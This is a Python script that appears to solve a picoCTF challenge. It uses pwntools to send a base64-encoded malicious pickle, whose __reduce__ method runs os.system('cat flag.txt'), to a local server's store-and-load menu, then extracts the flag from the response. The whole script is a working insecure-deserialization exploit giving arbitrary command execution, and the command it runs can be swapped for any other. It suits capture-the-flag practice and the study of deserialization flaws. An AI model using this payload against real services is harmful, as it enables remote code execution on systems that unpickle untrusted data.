from pwn import *
import base64
import re
import pickle
import base64
import os

def craft_input():
    # Define the malicious object
    class Exploit:
        def __reduce__(self):
            return (os.system, ("cat flag.txt",))

    # Craft the payload
    payload = pickle.dumps(Exploit())

    # Convert the payload to Base64
    payload_b64 = base64.b64encode(payload).decode()

    return payload_b64

def hack_server(payload):
    """Connect to the remote server and exploit the pickle vulnerability to retrieve the flag."""
    try:
        # Connect to the server
        conn = remote("localhost", 60693)

        # Store data
        conn.sendline(b"1")

        # Send the malicious payload (Base64 encoded pickle payload)
        # payload = "gASVJAAAAAAAAACMAm9zlIwGc3lzdGVtlJOUjAxjYXQgZmxhZy50eHSUhZRSlC4="
        conn.sendline(payload.encode())

        # Load data
        conn.sendline(b"2")

        # Exit
        conn.sendline(b"3")

        # Receive all output from the server
        response = conn.recvall(timeout=5).decode()

        # Extract the flag (look for `picoCTF{...}`)
        match = re.search(r"picoCTF\{.*?\}", response)
        if match:
            flag = match.group(0)
            # Save the flag to a file
            with open("./flag", "w") as w:
                w.write(flag)
            print(f"Flag saved: {flag}")
        else:
            print("Flag not found in the response!")

    except Exception as e:
        print(f"Error during connection or processing: {e}")

def main():
    """Main function to execute the exploit."""
    hack_server(craft_input())

if __name__ == "__main__":
    main()
